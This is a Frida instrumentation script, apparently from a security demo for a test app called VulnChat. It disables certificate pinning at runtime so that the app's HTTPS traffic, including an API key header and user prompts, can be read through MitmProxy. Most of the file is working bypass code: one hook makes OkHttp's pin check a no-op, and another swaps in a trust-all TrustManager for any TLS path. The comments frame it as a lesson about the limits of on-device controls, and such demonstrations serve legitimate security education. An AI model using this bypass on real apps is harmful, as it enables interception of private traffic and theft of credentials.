/*
 * bypass_pinning.js — defeat OkHttp certificate pinning at runtime
 *
 * WHAT THIS PROVES
 *   VulnChat's hardened build pins api.anthropic.com at two layers: OkHttp's
 *   CertificatePinner and the OS-level Network Security Config. Pinning stops
 *   a MitmProxy interception demo cold — the TLS handshake fails.
 *
 *   This script neutralises OkHttp's CertificatePinner from inside the
 *   process, so a rooted attacker can route traffic through MitmProxy and
 *   read the request — including the x-api-key header and the full prompt —
 *   even against the pinned build.
 *
 *   The lesson for the demo: certificate pinning raises the bar against a
 *   NETWORK attacker, but it is enforced by client code, and client code on a
 *   rooted device is not trustworthy. Pinning defeats passive interception;
 *   it does not defeat an attacker who controls the runtime. This is the same
 *   theme as the key hook — on-device controls are a trade-off against an
 *   attacker with that much access, not an absolute.
 *
 * WHAT IT DOES NOT DO
 *   It does not touch the OS-level Network Security Config pin-set. To run a
 *   full interception you also install the MitmProxy CA as a system CA on the
 *   rooted device/emulator, which satisfies the NSC trust anchor. This script
 *   handles the OkHttp layer; the system-CA install handles the NSC layer.
 *   Mention both in the demo so the two-layer defence is represented honestly.
 *
 * USAGE
 *   frida -U -f com.vulnchat.hardened -l bypass_pinning.js
 *
 *   Then start MitmProxy and point the device proxy at it. Send a message in
 *   the app; the request appears in MitmProxy in cleartext.
 */

'use strict';

function log(msg) {
    console.log('\x1b[35m[bypass_pinning]\x1b[0m ' + msg);
}

Java.perform(function () {
    var hooked = 0;

    // ── 1. OkHttp CertificatePinner.check() ─────────────────────────────────
    // The core of OkHttp pinning. check(hostname, peerCertificates) throws
    // SSLPeerUnverifiedException on a pin mismatch. Replacing it with a no-op
    // makes every certificate pass the pin check.
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');

        // check(String, List) — the modern signature
        CertificatePinner.check.overload('java.lang.String', 'java.util.List')
            .implementation = function (hostname, peerCertificates) {
                log('CertificatePinner.check() bypassed for: ' + hostname);
                return; // returning normally == pin check passed
            };
        hooked++;

        // check(String, Certificate[]) — older/overloaded signature, present
        // in some versions. Wrapped in its own try so a missing overload on
        // this build does not abort the whole script.
        try {
            CertificatePinner.check.overload('java.lang.String', '[Ljava.security.cert.Certificate;')
                .implementation = function (hostname, peerCertificates) {
                    log('CertificatePinner.check(varargs) bypassed for: ' + hostname);
                    return;
                };
            hooked++;
        } catch (e2) { /* overload not present on this build — fine */ }

        log('OkHttp CertificatePinner neutralised (' + hooked + ' overload(s))');
    } catch (e) {
        log('OkHttp CertificatePinner not found: ' + e);
    }

    // ── 2. Fallback: TrustManager (covers non-OkHttp TLS paths) ─────────────
    // Not strictly needed for VulnChat since it uses OkHttp, but included so
    // the same script works if the app later adds a different HTTP stack.
    try {
        var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
        var SSLContext = Java.use('javax.net.ssl.SSLContext');

        var TrustManagerImpl = Java.registerClass({
            name: 'com.vulnchat.demo.BypassTrustManager',
            implements: [X509TrustManager],
            methods: {
                checkClientTrusted: function (chain, authType) {},
                checkServerTrusted: function (chain, authType) {},
                getAcceptedIssuers: function () { return []; }
            }
        });

        var init = SSLContext.init.overload(
            '[Ljavax.net.ssl.KeyManager;',
            '[Ljavax.net.ssl.TrustManager;',
            'java.security.SecureRandom'
        );
        init.implementation = function (km, tm, sr) {
            log('SSLContext.init() patched with permissive TrustManager');
            init.call(this, km, [TrustManagerImpl.$new()], sr);
        };
        log('TrustManager fallback installed');
    } catch (e) {
        log('TrustManager fallback skipped: ' + e);
    }

    log('Ready. Route traffic through MitmProxy and send a message.');
    log('Reminder: also install the MitmProxy CA as a SYSTEM CA to satisfy');
    log('the OS Network Security Config pin-set — this script only covers OkHttp.');
});
